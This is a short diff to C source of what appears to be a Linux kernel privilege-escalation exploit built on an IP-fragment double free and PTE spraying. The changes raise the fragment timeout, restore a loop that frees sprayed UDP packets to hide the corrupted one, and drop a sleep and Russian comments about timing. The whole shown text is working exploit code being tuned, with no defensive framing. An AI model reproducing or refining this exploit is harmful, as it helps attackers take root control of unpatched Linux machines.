@@ -301,7 +301,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
 	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);
 
-	set_ipfrag_time(1); //тут сократил время жизни пакета до 3х секунд
+	set_ipfrag_time(9999);
 
 	printf("[*] waiting for the calm before the storm...\n");
 	sleep(CONFIG_SEC_BEFORE_STORM);
@@ -319,13 +319,12 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
 	
-		// push N skbs to skb freelist
-		// for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-		//{
-		//	PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		//	recv_ipv4_udp(1);
-		//}
-	sleep(30); //тут добавил сон перед залпом PTE и вторым освобождением
+	// push N skbs to skb freelist
+	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
+	{
+		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
+		recv_ipv4_udp(1);
+	}
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
